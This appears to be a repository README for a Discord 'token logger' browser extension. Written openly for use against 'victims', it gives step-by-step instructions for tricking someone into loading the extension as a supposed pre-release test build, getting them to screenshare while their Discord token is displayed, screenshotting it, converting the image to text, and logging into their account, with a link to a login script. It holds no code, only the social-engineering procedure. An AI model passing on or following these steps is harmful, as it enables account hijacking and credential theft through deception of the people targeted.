# Discord-Extension-Token-Logger
This is an add-on/better version to my previous repository. This allows you to token login your victims DISCORD with just an extension.

Showcase: https://streamable.com/p2rccz

Steps: Get your victim to screenshare or screenshot (screensharing is better) act like this is a pre-development chrome extension that you need them to test, after that send them the files once they have it tell them to go to chrome://extensions click developer mode then in the top right you'll see load unpacked click that and put the "config" file in. Once they do that tell them to go to https://discord.com/channels/@me THIS EXACT LINK and their token will display. QUICKLY take a screenshot and go to https://www.prepostseo.com/image-to-text convert the image to text and login to their discord account. You can use https://github.com/SipinSlowly/new-discord-token-login-script/blob/main/epic.txt to login if you need.
